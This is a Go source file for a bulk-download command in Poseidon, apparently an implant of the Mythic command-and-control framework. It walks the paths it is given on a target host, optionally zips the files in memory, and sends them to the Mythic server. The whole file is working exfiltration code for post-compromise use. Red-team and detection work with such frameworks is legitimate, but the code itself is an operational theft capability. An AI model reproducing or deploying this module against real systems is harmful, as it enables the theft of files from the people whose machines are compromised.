package download_bulk

import (
	"archive/zip"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"sync"
	"time"

	// Poseidon
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// zipFilesAndDirectories compresses files/directories into a single zip in memory
func zipFilesAndDirectories(paths []string) (*bytes.Buffer, error) {
	var buffer bytes.Buffer
	zipWriter := zip.NewWriter(&buffer)

	for _, path := range paths {
		err := filepath.Walk(path, func(filePath string, info os.FileInfo, err error) error {
			if err != nil {
				return fmt.Errorf("error accessing path %s: %w", filePath, err)
			}

			relativePath, err := filepath.Rel(filepath.Dir(path), filePath)
			if err != nil {
				return fmt.Errorf("error calculating relative path for %s: %w", filePath, err)
			}

			if info.IsDir() {
				_, err := zipWriter.Create(relativePath + "/")
				if err != nil {
					return fmt.Errorf("error creating directory in zip: %w", err)
				}
				return nil
			}

			fileWriter, err := zipWriter.Create(relativePath)
			if err != nil {
				return fmt.Errorf("error creating file in zip: %w", err)
			}

			file, err := os.Open(filePath)
			if err != nil {
				return fmt.Errorf("error opening file %s: %w", filePath, err)
			}
			defer file.Close()

			_, err = io.Copy(fileWriter, file)
			if err != nil {
				return fmt.Errorf("error writing file to zip: %w", err)
			}

			return nil
		})

		if err != nil {
			return nil, err
		}
	}

	err := zipWriter.Close()
	if err != nil {
		return nil, fmt.Errorf("error closing zip writer: %w", err)
	}

	return &buffer, nil
}

// Define a struct to parse parameters
type bulkDownloadArgs struct {
	Paths    []string `json:"paths"`    // List of file or directory paths
	Compress bool     `json:"compress"` // Option to compress the files/directories
}

// Run - Function that executes the download task
func Run(task structs.Task) {
	msg := task.NewResponse()
	args := bulkDownloadArgs{}
	err := json.Unmarshal([]byte(task.Params), &args)

	if err != nil {
		msg.SetError(fmt.Sprintf("Failed to parse parameters: %s", err.Error()))
		task.Job.SendResponses <- msg
		return
	}

	if args.Compress {
		// Compress the specified files and directories into a zip archive in memory
		zipBuffer, err := zipFilesAndDirectories(args.Paths)
		if err != nil {
			msg.SetError(fmt.Sprintf("Failed to create zip archive: %s", err.Error()))
			task.Job.SendResponses <- msg
			return
		}

		// Prepare the download message with the zip data
		zipData := zipBuffer.Bytes() // Store the result in a variable
		downloadMsg := structs.SendFileToMythicStruct{
			Task:                 &task,
			IsScreenshot:         false,
			SendUserStatusUpdates: true,
			Data:                 &zipData, // Use address of the variable
			FileName:             "download.zip",
			FinishedTransfer:     make(chan int, 2),
		}

		// Send the file to Mythic
		task.Job.SendFileToMythic <- downloadMsg

		handleTransferCompletion(task, downloadMsg)
		// Send completed message after transfer
		msg.Completed = true
		msg.UserOutput = "Finished Downloading"
		task.Job.SendResponses <- msg
	} else {
		// Handle files directly without compression
		var wg sync.WaitGroup
		filesStarted := 0
		for _, path := range args.Paths {
			fullPath, err := filepath.Abs(path)
			if err != nil {
				msg.UserOutput = fmt.Sprintf("Error resolving path: %s", err.Error())
				task.Job.SendResponses <- msg
				continue
			}

			fi, err := os.Stat(fullPath)
			if err != nil {
				msg.UserOutput = fmt.Sprintf("Error accessing path: %s", err.Error())
				task.Job.SendResponses <- msg
				continue
			}

			if fi.IsDir() {
				filepath.Walk(fullPath, func(filePath string, info os.FileInfo, walkErr error) error {
					if walkErr != nil {
						return fmt.Errorf("error walking through path %s: %w", filePath, walkErr)
					}
					if !info.IsDir() {
						file, err := os.Open(filePath)
						if err != nil {
							msg.SetError(fmt.Sprintf("Error opening file: %s", err.Error()))
							task.Job.SendResponses <- msg
							return fmt.Errorf("error opening file: %w", err)
						}
						wg.Add(1)
						filesStarted++
						downloadMsg := structs.SendFileToMythicStruct{
							Task:                 &task,
							IsScreenshot:         false,
							SendUserStatusUpdates: true,
							File:                 file,
							FileName:             info.Name(),
							FullPath:             filePath,
							FinishedTransfer:     make(chan int, 2),
						}
						task.Job.SendFileToMythic <- downloadMsg
						go func(file *os.File, dm structs.SendFileToMythicStruct) {
							handleTransferCompletion(task, dm)
							file.Close()
							wg.Done()
						}(file, downloadMsg)
					}
					return nil
				})
			} else {
				file, err := os.Open(fullPath)
				if err != nil {
					msg.SetError(fmt.Sprintf("Error opening file: %s", err.Error()))
					task.Job.SendResponses <- msg
					continue
				}
				wg.Add(1)
				filesStarted++
				downloadMsg := structs.SendFileToMythicStruct{
					Task:                 &task,
					IsScreenshot:         false,
					SendUserStatusUpdates: true,
					File:                 file,
					FileName:             fi.Name(),
					FullPath:             fullPath,
					FinishedTransfer:     make(chan int, 2),
				}
				task.Job.SendFileToMythic <- downloadMsg
				go func(file *os.File, dm structs.SendFileToMythicStruct) {
					handleTransferCompletion(task, dm)
					file.Close()
					wg.Done()
				}(file, downloadMsg)
			}
		}
		if filesStarted > 0 {
			wg.Wait()
		}
		msg.Completed = true
		msg.UserOutput = "Finished Downloading"
		task.Job.SendResponses <- msg
	}
}

// handleTransferCompletion handles the completion of the file transfer
func handleTransferCompletion(task structs.Task, downloadMsg structs.SendFileToMythicStruct) {
	for {
		select {
		case <-downloadMsg.FinishedTransfer:
			return
		case <-time.After(1 * time.Second):
			if task.DidStop() {
				msg := task.NewResponse()
				msg.SetError("Tasked to stop early")
				task.Job.SendResponses <- msg
				return
			}
		}
	}
}
